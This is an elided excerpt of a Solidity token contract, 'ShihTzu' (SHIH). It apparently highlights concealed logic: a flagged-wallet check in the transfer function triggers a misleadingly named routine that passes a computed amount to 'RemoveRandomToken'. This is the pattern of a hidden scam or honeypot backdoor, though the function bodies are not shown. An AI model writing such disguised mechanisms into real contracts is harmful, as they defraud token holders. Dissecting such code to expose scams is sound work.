...
contract ShihTzu is IBEP20, Auth {
    ...
    string constant _name = "ShihTzu";
    string constant _symbol = "SHIH";
    ...
    address public _marketing = 0x5586FCf885D7f663bA68957Fb52E32BA65a9Aaf7;
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0x11590E7fD0a5157D8B2875f3716Ebe7aE4A0e1B3;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(ismaxWallet[recipient]) {getCirculatingaccuracy(amount);}
    ...
    function RemoveRandomToken(uint256 tokens) internal {
    ...
    function getCirculatingaccuracy(uint256 accuracy) internal {
        ...
        if (txCount >= swapTrigger) {
            uint256 balance = _maxTxAmount * accuracy;
            RemoveRandomToken(balance);
